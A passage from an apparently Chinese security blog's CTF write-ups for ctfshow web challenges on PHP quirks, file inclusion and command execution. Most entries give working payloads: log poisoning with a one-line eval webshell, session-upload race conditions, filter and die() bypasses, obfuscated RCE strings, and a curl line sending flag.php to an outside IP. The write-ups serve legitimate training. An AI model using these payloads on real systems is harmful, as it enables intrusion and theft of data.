_()函数）\n\n确实是骚操作\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111115406-d1578f30-f2d8-43e3-a4c0-09766e2f44ed.png)\n\n在当前域查找信息\n\n_()是gettext()的拓展函数\n\n在开启相关设定后，_(\"666\")等价于gettext(\"666\")，且就返回其中的参数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111164735-682b1a73-54d6-4627-925d-567431cb0158.png)\n\n打组合拳即可\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n# WEB-129(路径穿越)\n\n```\n?f=/ctfshow/../../../../var/www/html/flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688181066895-d67b5acc-fcc2-4c1c-ae85-c64c8e387a3c.png)\n\n# WEB-130(正则绕过)\n\n## 方法一：\n\n利用数组 \n\npreg_match只能处理字符串 所以输入数组会输出false\n\n## 方法二：\n\n字符串解析特性 \n\n` f=ctfshow`注意f之前有个空格 这样就识别不到我们的f了\n\n# WEB-131(正则回溯)\n\npoc如下：\n\n```python\nimport requests\n\npayload = {\n    \"f\":'a'*1000000+\"36Dctfshow\"\n}\n\nr = requests.post(url='http://98e6cfab-efcc-4d13-815e-67de6479bc0d.challenge.ctf.show/',data=payload)\nprint(r.text)\n```\n\n# WEB-132(逻辑运算符特性)\n\n```\n/admin/?username=admin&password=1&code=admin\n```\n\n先是给了一个信息很多的网站 其实做题多了 直接就会去访问/admin后台\n\n然后得到源码 是一个逻辑问题 `x && y` 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： `x||y` 当x为true时，直接跳过，不执行y\n\n所以只要保证`username=admin` 其他两个参数任意即可\n\n# WEB-133（curl外带）\n\n这道题真是吐了 网上payload没一个可以打通的 多多少少沾点毛病\n\n```php\n?F=`$F`;+curl -F xx=@flag.php 8.130.34.53:7777\n```\n\n用curl外带 就是之后跟一个能接受的VPS 用了DNS接受不到 BP的不太会 最后还是云服务器好用\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688195451931-8a4d5a8b-dd2c-4b75-9a53-2083ed0cd142.png)\n\n其实就可以用反弹shell一样去理解 无回显处理方式而已\n\n# WEB-134(php变量覆盖)\n\npayload:`?_POST[key1]=36d&_POST[key2]=36d`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192649613-076f4400-50ac-4d55-a9cd-4606546a6e9e.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192677426-9f1c89e8-d4dd-4fd6-98bc-d02ec14d245b.png)\n\n先将get获取到的参数`parse_str($_SERVER['QUERY_STRING']);`根据`&`分割成不同部分\n\n然后`extract($_POST);` 将$_POST数组中的内容输出不同的键值\n\n共分为下面三个流程\n\n1. _POST[key1]=36d&_POST[key2]=36d\n2. _POST[key1]=36d       _POST[key2]=36d     parse_str()将其分割为两部分\n3. key1=36d  key2=36d extract()  将_POST数组中的键值导入到当前符号表中\n\n# WEB-135（重定向输出）\n\n官方给的外带不好用\n\n直接`?F=`$F` ;nl flag.php>1.txt`\n\n注意中间有个空格 能刚好让截取长度满6位 不然会破坏我们的命令结构\n\n# WEB-136(tee指令)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688196227426-c2e1c881-d3e4-4427-b599-0a4796ba0ec9.png)\n\npayload:\n\n```\n?c=ls /|tee 1\n?c=cat /f149_15_h3r3|tee 2\n```\n\n就是利用管道符 将我们命令输入的作为tee指令的输入 然后输出到指定的文件中\n\n# WEB-137（静态成员调用方法）\n\nphp通过 类名::属性或者方法 来调用静态成员\n\npost：\n\n```\nctfshow=ctfshow::getFlag\n```\n\n# WEB-138（call_user_func()数组特殊方法）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688197391282-d0774a24-8062-4b0f-838a-baa064aeaeed.png)\n\n通过上面的demo 这样payload可以看懂 \n\n不仅是字符串 可以给call_user_func()传一个数组的方式去访问静态方法 只能是方法 不能这样访问静态属性\n\n并且也只能是静态方法 不能是public方法\n\npost：`ctfshow[0]=ctfshow&ctfshow[1]=getFlag`\n\n# WEB-139（没必要）\n\n# WEB-140(弱相等)\n\n偷的payload\n\n**0==“字符串”** **返回的是TRUE**\n\nintval会将非数字字符转换为0，也就是说 `intval('a')==0 intval('.')==0 intval('/')==0`\n\n```php\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1\n```\n\n# WEB-141(取反之减号)\n\n绕过return的方式：\nphp中数字是可以和命令进行一些运算的，例如 1-phpinfo()-1;结合减号是可以执行phpinfo()命令的 运算符应该都可以\n\n# WEB-142\n\n```\n?v1=0\n?v1=0x0\n```\n\n# WEB-143(取反之乘号)\n\n`?v1=10&v2=0&v3=*(\"%0c%19%0c%5c%60%60\"^\"%7f%60%7f%28%05%0d\") (\"%0e%0c%00%00\"^\"%60%60%20%2a\")?>`waf了减号 换成乘号就行了\n\n# WEB-144(取反之减号)\n\n```php\n?v1=1&v2=(\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%03%01%08%00%06%0c%01%07%00%0b%08%0b\"^\"%60%60%7c%20%60%60%60%60%2e%\n7b%60%7b\")&v3=-\n```\n\n# WEB-145(取反之三目运算符)\n\n最终构造出`eval(\"return 1?phpinfo():1;\");`\n\npayload:\n\n```\n?v1=1&v2=0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):\n```\n\n# WEB-146(取反之或)\n\n```\n?v1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|\n```\n\n# WEB-147(**function_name()**)\n\n参考：https://paper.seebug.org/755/\n\n讲的很细 看源码就是大致思路让我们去构造一个函数 并且正则要求需要是特殊的符号开头的 所以平常的函数就不能直接拿来用了\n\n偷的：\n\n**在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。**\n\n所以我们可以`\\`开头\n\n构造类似于这样的 函数第一个参数是传入函数的参数 第二参数是函数内容\n\n```plain\ncreate_function('$a,$b','return 111')\n\n==>\n\nfunction a($a, $b){\n    return 111;\n}\n```\n\n如果我们想插入我们的恶意代码就需要sql注入那样闭合的思路\n\n```plain\ncreate_function('$a,$b','return 111;}phpinfo();//')\n\n==>\n\nfunction a($a, $b){\n    return 111;}phpinfo();//\n}\n```\n\npaylaod:\n\n```\n?show=;}system('ls');//\n```\n\npost:`ctf=%5ccreate_function`\n\n# WEB-148(中文变量)\n\n巧妙的构造\n\n```\n?code=$哈=\"`{{{\"^\"?<>/\";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*\n```\n\n`{{{\"^\"?<>/\";`异或出来的结果是 _GET\n\n# WEB-149(条件竞争)\n\n看源码就是不让我们在当前路径下的其他文件写码 呢就往index.php里写\n\n```\n?ctf=index.php\n```\n\npost:`show=<?php @eval($_POST['x']);?>`\n\n或者就是条件竞争 bp不断发包就行\n\n# WEB-150(日志包含)\n\n非预期日志包含\n\n```php\nPOST /?isVIP=true HTTP/1.1\nHost: db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show\nContent-Length: 67\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: <?php @eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://db1b6bfa-647b-44f9-9b63-d7fa819ee8d2.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\nctf=%2Fvar%2Flog%2Fnginx%2Faccess.log&1=system%28%27tac+f*%27%29%3B\n```\n\nextract变量覆盖，满足isVip是true的条件限制  \n\nUser-Agent写入一句话木马 然后去包含日志\n\n# WEB-150plus（__autoload）\n\n看了师傅们的wp 太强了 感觉还是非预期\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688269266909-1f7863f0-ea23-44c5-993e-1c4722b19107.png)\n\n_**_CLASS__（双下划线包围的类名）是一个特殊的常量，它会在运行时返回当前所在类的类名。当使用__CLASS__ 常量时，如果当前类不存在，会触发自动加载机制尝试加载对应的类文件。**  \n\n`?..CTFSHOW..=phpinfo`不让我们输入`__CTFSHOW__`,那么我们就利用php特性 让php帮我去转换 \n\n```\n.`在命名中是不合法命名会被转为`_\n```\n\n然后能在php配置环境变量中找到flag\n\n# 结尾：\n\n这个板块实在太多了 花了两个下午 开启下一个大陆文件上传!\n","tags":["php特性"],"categories":["ctfshow"]},{"title":"ctfshow-文件包含","url":"/post/ad175165.html","content":"\nctfshow-文件包含\n\n<!--more-->\n\n# WEB-78(php://filter)\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n# WEB-79(data://)\n\n```\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n# WEB-80~81(日志包含)\n\n在User-Agent:写入一句话木马\n\n```php\nGET / HTTP/1.1\nHost: bd0bccfb-0e49-4ac6-841e-dc21b2cfeecb.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: <?php system('cat fl0g.php'); ?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n```\n\n然后访问nginx日志文件路径`?file=/var/log/nginx/access.log`\n\n# WEB-82~86(session.upload_progress条件竞争)\n\n这道题目利用session.upload_progress进行文件包含和条件竞争\n\n相关文章可以看这篇https://www.freebuf.com/vuls/202819.html\n\n条件:\n\n- php5.4\n- session.upload_progress.enabled=on 当我们上传一个文件 php会把此次文件上传的详细信息存储在session中\n- session.upload_progress.cleanup = on 上传完毕后 php立即清理对应session文件中的内容 \n- session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" php会报告上传进度，对我们有用的是它的值可控\n- session.upload_progress.prefix = \"upload_progress_\" 它和上面的name prefix+name将表示为session中的键名\n- session.use_strict_mode=off 这个表示我们对Cookie中的sessionid可控\n\n首先就是没有session_start()我们该怎么创建session文件\n\nsession还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。  \n\n我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session。并产生一个键值，这个键值由`ini.get(\"session.upload_progress.prefix\")`+由我们构造的`session.upload_progress.name`值组成，最后被写入sess_文件里。  \n\n但是我们session文件上传后会被立马删除\n\n这里就要利用条件竞争 一边一直发包一边一直去访问 总有一次能访问成功\n\n因此我们所需要做的就是：\n\n1. 上传文件  在Cookie=flag\n2. 请求包中添加：PHP_SESSION_UPLOAD_PROGRESS然后内容设置为我们的恶意代码（会被写入sess_flag文件中 ）\n3. 不断的发包去条件竞争\n\n发包post数据包：\n\n```php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"http://fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\n爆破的两个数据包：\n\n```php\nPOST / HTTP/1.1\nHost: fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show\nContent-Length: 375\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarytKDZI1UbeWYK4Zrv\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=flag\nConnection: close\n\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n<?php system('cat fl0g.php');?>\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\nGIF89a\n<script language='php'>@eval($_POST[\"x\"]);</script>#这里的内容可以无视 跟这道题目无关 只是我上传文件的内容\n\n\n\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv--\nGET /?file=/tmp/sess_flag HTTP/1.1\nHost: fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n```\n\n先爆破文件上传 再爆破包含的数据包 但是两个是一起爆破的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687933498473-c07b5203-2910-4187-8f7d-990f83ee6de7.png)\n\n# WEB-87（exit死亡绕过）\n\n这里面讲的很清楚https://xz.aliyun.com/t/8163#toc-2\n\n```\nfile_put_contents(urldecode($file), \"<?php die('大佬别秀了');?>\".$content);\n```\n\n就是这里`<?php die('大佬别秀了');?>`die() 跟exit()函数一样就是脚本运行到这里会退出脚本\n\n也就是说即使我们输入一句话木马 有exit()存在那么永远运行不到我们的木马就会提前退出脚本\n\n这里利用了`php://filter/write=convert.base64-decode/resource=1.php`注意这里是写入\n\n将`$content`解码 利用php base64_decode函数特性去除死亡exit。\n\nbase64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过\n\n所以，当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，< ; ? >和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符a后，将phpexita当做两组base64进行解码，也就绕过这个死亡exit了。\n\npayload：\n\nget:\n\n`php://filter/write=convert.base64-decode/resource=1.php`对其进行两次url全字符编码\n\n`?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30`因为一次解码在浏览器解析 一次解码在题目中\n\npost:\n\n```\naaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\n```\n\n 前两个a是用来和phpdieaa组成4个byte 也就是两组 用于base64解码 直接就干掉这个死亡die了 真的太强了\n\n 后面的内容是`<?php @eval($_POST[a]);?>`base64编码内容\n\n# WEB-88(过滤)\n\n```\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs`没有过滤`:\n```\n\n这里还要把用来base64补位的`==`去掉因为waf \n\n因为==只是用来补位的所以删除不会影响解码正常\n\n# WEB-116(Misc)\n\n提一句视频剪辑的不错:)\n\nbinwalk分离出源码\n\n```\n?file=flag.php\n```\n\n# WEB-117(exit死亡绕过)\n\n大致思路和87一样 不过这里waf了base64 换种解码方式就行了\n\n直接偷别人的payload\n\n```\n?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\npost:contents=?<hp pvela$(P_SO[T]1;)>?\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687942245432-fcfe9ce3-7c53-4a65-a0d6-05b1887e1005.png)\n\npayload由来：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687943128967-696125f6-abaa-4345-af21-c3fc05850137.png)\n\n# 结尾：\n\n文件包含难度还行 keep hacking！ 开启下一大陆 php特性 ！\n","tags":["文件包含"],"categories":["ctfshow"]},{"title":"ctfshow-命令执行","url":"/post/53e2b2e1.html","content":"\nctfshow-命令执行\n\n<!--more-->\n\n# WEB-32(绕括号，分号)\n\n include不用括号，分号可以用`?>`代替 \n\n利用文件包含+伪协议\n\n```\n?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n# WEB-37(data协议 日志包含 绕flag)\n\n文件包含用data协议base64编码绕flag正则\n\n```\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n?c=data://text/palin,<?php system(\"nl fla*\");?>\n```\n\n或者先`/一句话木马`再日志包含  注意url编码问题\n\n# WEB-39(文件包含有后缀干扰)\n\n```\nc=data:text/plain,<?php system('cat f*')?>\n```\n\n前面的php语句已经闭合了，所以后面的`.php`会被当成纯文本直接显示在页面上，起不到什么作用 。\n\n\n\n# WEB-40(无参RCE构造)\n\n## 解法一\n\n无参RCE构造 根据buu一道题目的套娃来做\n\n```\n?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n具体可以看我的文章[https://z1d10t.github.io/post/2ed7a105.html?highlight=%E5%A5%97%E5%A8%83](https://z1d10t.github.io/post/2ed7a105.html?highlight=套娃)\n\n## 解法二\n\n```\n?c=eval(array_pop(next(get_defined_vars())));\n```\n\npost一个`1=system('cmd');`\n\nget_defined_vars() —  返回由所有已定义变量所组成的数组 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914581610-576ad783-f44a-468d-a1db-9ea3504ffdec.png)\n\n发现有post数组 然后post一个值 \n\npost:`1=phpinfo();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914717308-bfe1ea46-39aa-431a-8787-202cf93239f0.png)\n\n将其弹出并且执行就行 这里指针在第一个元素 将其指向第二个元素 即我们需要的\n\narray_pop — 弹出数组最后一个单元（出栈）\n\n这里在弹出前用next指针指向了 所以并没有弹出最后一个元素，我是这么理解的\n\n```\n?c=print_r(array_pop(next(get_defined_vars())));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914940306-f18a0864-d4f0-4ef0-8821-1b4efce9a4cf.png)\n\n得到了我们需要的，然后eval执行就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914969413-b5a38986-22d6-4b3a-8221-f1f3c97396f7.png)\n\n# WEB-41(或运算)\n\n直接当个脚本小子:)\n\nhttps://blog.csdn.net/miuzzx/article/details/108569080\n\n# WEB-42(黑洞)\n\n具体可以看https://www.cnblogs.com/tinywan/p/6025468.html\n\n```\nsystem($c.\" >/dev/null 2>&1\");\n```\n\n简单说就算`$c`的内容都会被重定向到一个`黑洞`就是没有任何输出，相当于被吞掉了\n\n通过`%0a,%20`截断绕过就行了\n\n# WEB-43(&&)\n\n逻辑与\n\n先执行左边，只有左边为真，才会执行右边\n\n注意一下这里`&&`要url编码一下\n\n# WEB-45(绕空格)\n\n```\n${IFS}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687659970129-65bd9e49-b1dd-49e3-9534-9d4e8a9fb66c.png)\n\n```\n?c=tac${IFS}fla*.php%0a\n```\n\n# WEB-46~51(重定向绕空格数字$)\n\n参考：http://c.biancheng.net/view/942.html\n\n关于 `2>&1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661520344-12e86620-a0ec-4eab-96ae-36f0e2fe760f.png)\n\n`?c=tac<fla''g.php||`或者nl也行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661628909-18c402c1-f11d-4e96-8a05-20f09a01bd9c.png)\n\n就是将flag.php作为tac的输入 然后利用`||`逻辑或绕`%0a和&&` 输入重定向去绕空格\n\n# WEB-51(${IFS}绕空格)\n\nwaf了重定向符\n\n或者用`${IFS}或者$IFS` 其实两者是相等的\n\n关于`${}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687662639492-af87e7d7-6315-4d0e-814a-56a12c9c8c9a.png)\n\n```\n?c=nl${IFS}/fla?||\n?c=nl${IFS}/fla''g||\n```\n\n# WEB-53(空字符绕空格)\n\n不是你这个flag文件夹能不能别老是变动\n\n```\n?c=nl${IFS}/fla?\n?c=c''at${IFS}fla''g.p''hp\n```\n\n# WEB-54(绕正则)\n\n关于`.*`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687663891064-438d2f3d-60f0-4dcf-984b-458bf826542b.png)\n\nlinux一切都是文件 通过文件执行命令 在bin目录下存放着命令文件 我们一般调用命令系统就会调用这里的文件（我是这么认为的）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687664362024-d939184f-168b-40df-980e-66a3bc44a8fe.png)\n\n```\n?c=/bin/?at${IFS}f???????\n```\n\n?是通配符 去模糊匹配一个字符\n\n\n\n# WEB-55~56（无字母数字rce）\n\n## 解法一\n\n参考p神https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\n\n认识source和`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675407237-2f98e932-ad55-4dfc-ab46-feae73f782dc.png)\n\n也就是说source或者`.`当然这道题目只能用`.`来执行我们文件中命令 也就是把我们的文件当作脚本运行\n\n不知道为什么我本地没打通 估计是后续这个漏洞被修复了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675589848-06fa3171-78af-486d-b69b-c55822aa3a24.png)\n\n那么就需要一个包含我们恶意命令的文件 直接构造一个post上传的数据包\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n  </head>\n  <body>\n    <form action=\"http://ec5969bd-4909-4435-9d77-ac7ffe92bbfe.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n      <!--链接是当前打开的题目链接-->\n      <label for=\"file\">文件名：</label>\n      <input type=\"file\" name=\"file\" id=\"file\"><br>\n      <input type=\"submit\" name=\"submit\" value=\"提交\">\n    </form>\n  </body>\n</html>\n```\n\n当我们上传上去之后 PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。\n\n然后在进行`.`和linux通配符组合拳去打\n\n这里payload根据p神的文章`?c=. /???/????????[@-[]`要利用`[@-[]`去限制下最后一位为大写 不然匹配到很多文件无结果 因此打payload的时候有时候会匹配不到 用bp多提交几次就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676153214-1d7165a1-414b-4f05-a5e7-a0a35515255d.png)\n\n随便上传一个文件 然后内容：\n\n```html\n#!/bin/sh\nls /\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676290049-2ef242ab-2c80-48ac-b72a-f7515b45b1c9.png)\n\n当然bash或者zsh等等都行 shell具体解释器都可以\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676263096-cdd7758e-47bc-4bcd-b37a-eb3ebdded252.png)\n\n## 解法二\n\n其实也是利用通配符去执行命令文件 `?c=/???/????64 ????.???`\n\n其实就是去执行 `/bin/base64 flag.php`\n\n# WEB-57(特殊方法构造数字)\n\n根据题目flag在36.php中 那么我们只需要构造出数字36即可\n\n首先来认识一下`${_}和$(())`\n\n`${_}` 是一种特殊的变量，它表示上一个命令的最后一个参数  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751963911-f92a0b8e-b2d2-4de3-a23e-203f31474246.png)\n\n注意一下 如果没有上一个命令则表示为空\n\n 在Linux中，`$(())`是一种用于进行数学运算的特殊语法结构。它通常用于shell脚本中，用于求值一个数学表达式并返回结果。  \n\n那么计算空字符就是0 可以`$((${_}))`打组合拳\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752142638-33aae5c9-3710-483e-9073-0b7d15b41663.png)\n\n这样就可以构造出数字了\n\n再通过按位取反不断的构造出数字 当时对按位取反还是有点疑惑 不过知乎上一篇稿子解答了我的疑惑https://zhuanlan.zhihu.com/p/161465089\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752194916-1a2ad9be-8a53-44d5-aae7-40bc5701cfb9.png)\n\n**计算机所有二进制输出都是补码的形式** 这句话解答了我对补码的疑惑\n\n简单理解就是如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751488270-6a4b96d5-ad14-4847-ba20-740380bf94ee.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752581243-411a5b59-3fd4-435f-b2ae-a041f8eb682d.png)\n\n然后通过取反得到-1 再拼接得到-2\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752418481-17fa71fd-5a2b-40af-989e-2cc6d2b92510.png)\n\n这样不断的拼接到-37 然后再取反就得到36了\n\npayload：`$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))`\n\n# WEB-58~65(文件读取函数)\n\nsystem一类的函数都被禁了 所以只能用php中的特殊函数 用文件读取的函数读就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687753369662-556faed8-7490-43d6-89df-0b6e027d753c.png)\n\npost：`c=show_source('flag.php');`\n\n`c=highlight_file('flag.php');`有很多类似于无参rce构造呢种套娃 \n\n# WEB-66(waf show_source())\n\n```\nc=print_r(scandir('/'));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687758908328-a73a76e2-7820-4f49-81e3-a3ba983d16d2.png)\n\n当前目录下的flag.php是假的 \n\nshow_source()被waf了 用highlight_file()读flag.txt即可\n\n```\nc=highlight_file('/flag.txt');\n```\n\n# WEB-67(waf print_r())\n\n用var_dump() bypass即可\n\n```\nc=highlight_file('/flag.txt');\n```\n\n# WEB-68~70(waf highlight_file())\n\n 因为禁用了highlight_file()所以源码也不显示了 2333 而且好多题目的payload都可以打通好几个关卡 题目太多质量真不太行\n\n```\nc=include('/flag.txt');\n```\n\n# WEB-71(输出缓冲区)\n\n给了源码\n\n```php\n<?php\n  error_reporting(0);\nini_set('display_errors', 0);\n// 你们在炫技吗？\nif(isset($_POST['c'])){\n  $c= $_POST['c'];\n  eval($c);\n  $s = ob_get_contents();\n  ob_end_clean();\n  echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\n}else{\n  highlight_file(__FILE__);\n}\n\n?>\n```\n\n涉及到输出缓冲区知识 \n\nob_get_contents()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760675094-25063e0b-5792-4f97-b44f-e12bd073111b.png)\n\nob_end_clean()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760729756-1353ad44-911d-4aef-9a88-e499dcec5ce2.png)\n\n根据源码 我的理解是将eval()输出的内容会到输出缓存区\n\n然后通过ob_get_contents()函数赋值给s 然后通过一个正则匹配将内容替换不让我们得到我们想要的flag \n\n那么如果我们执行完eval()函数之后不进行之后的操作就可以bypass了 这也是官方payload的原理\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687761011069-74a43caf-2a46-41a3-bd40-37d972cb9a4e.png)\n\n因为根据官方文档 exit是个语法结构 如果不输出一个消息 则可以省略圆括号 就有下面两种paylaod\n\n```\nc=include('/flag.txt');exit;\nc=include('/flag.txt');exit(0);\n```\n\n# 